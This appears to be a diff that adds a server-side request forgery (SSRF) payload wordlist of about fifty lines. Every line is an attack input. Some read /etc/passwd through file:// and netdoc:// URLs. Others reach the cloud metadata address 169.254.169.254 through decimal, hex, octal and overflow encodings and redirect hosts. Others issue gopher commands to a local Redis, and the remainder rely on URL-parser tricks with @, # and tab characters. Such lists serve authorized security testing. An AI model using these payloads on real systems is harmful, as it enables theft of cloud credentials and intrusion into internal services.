@@ -1,0 +1,54 @@
+file:///etc/passwd
+file://\/\/etc/passwd
+netdoc:///etc/passwd
+netdoc:/\/\/etc/passwd
+http:/\/\/2852039166/
+http://2852039166/
+http://169.254.169.254
+http:\/\/169.254.169.254
+http://instance-data
+http:\/\/instance-data
+http://169.254.169.254.xip.io/
+http:\/\/169.254.169.254.xip.io/
+http://425.510.425.510/
+http:\/\/425.510.425.510/
+http://2852039166/
+http:\/\/2852039166/
+http://7147006462/
+http:\/\/7147006462/
+http://0xA9.0xFE.0xA9.0xFE/
+http:\/\/0xA9.0xFE.0xA9.0xFE/
+http://0xA9FEA9FE/
+http:\/\/0xA9FEA9FE/
+http://0x41414141A9FEA9FE/
+http:\/\/0x41414141A9FEA9FE/
+http://0251.0376.0251.0376/
+http:\/\/0251.0376.0251.0376/
+http://0251.00376.000251.0000376/
+http:\/\/0251.00376.000251.0000376/
+http://nicob.net/redir-http-169.254.169.254:80-
+http:\/\/nicob.net\/redir-http-169.254.169.254:80-
+http://127.0.0.1:2379/v2/stats/store
+http:\/\/127.0.0.1:2379\/v2\/stats\/store
+gopher://127.0.0.1:6379/_CONFIG%20GET%20maxmemory
+gopher:\/\/127.0.0.1:6379\/_CONFIG%20GET%20maxmemory
+http://brutelogic.com.br/poc.svg
+http:\/\/brutelogic.com.br\/poc.svg
+http://169.254.169.254 &@169.254.169.254# @169.254.169.254/
+http://2852039166 &@2852039166# @2852039166/
+http://169.254.169.254\;@169.254.169.254
+http://2852039166\;@2852039166
+http://google\;@2852039166
+http://169.254.169.254/#@169.254.169.254
+http://google.com/#@169.254.169.254
+http://2852039166/#@2852039166
+http://bug@169.254.169.254 @169.254.169.254/
+http://bug@2852039166 @2852039166/
+http://bug@169.254.169.254 @google.com/
+http://bug@2852039166 @google.com/
+http://169.254.169.254\tgoogle.com
+http://2852039166\tgoogle.com
+http://169.254.169.254%09google.com
+http://2852039166%09google.com
+http://169.254.169.254%2509google.com
+http://2852039166%2509google.com
